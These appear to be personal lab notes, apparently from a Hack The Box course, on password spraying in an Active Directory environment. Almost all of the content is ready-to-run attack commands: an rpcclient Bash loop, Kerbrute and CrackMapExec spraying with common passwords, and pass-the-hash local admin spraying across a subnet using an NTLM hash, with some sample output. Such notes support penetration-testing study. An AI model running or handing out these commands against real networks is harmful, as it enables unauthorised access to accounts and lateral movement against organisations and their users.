## Internal Password Spraying from a Linux Host
#### Using a Bash one-liner for the Attack

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```shell
3kjS@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT 
Account Name: sgage, Authority Name: INLANEFREIGHT
```
#### Using Kerbrute for the Attack

```shell
3kjS@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
![[Screenshot 2026-05-25 at 15.09.30.png]]
#### Using CrackMapExec & Filtering Logon Failures

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
#### Validating the Credentials with CrackMapExec

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
## Local Administrator Password Reuse
#### Local Admin Spraying with CrackMapExec

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
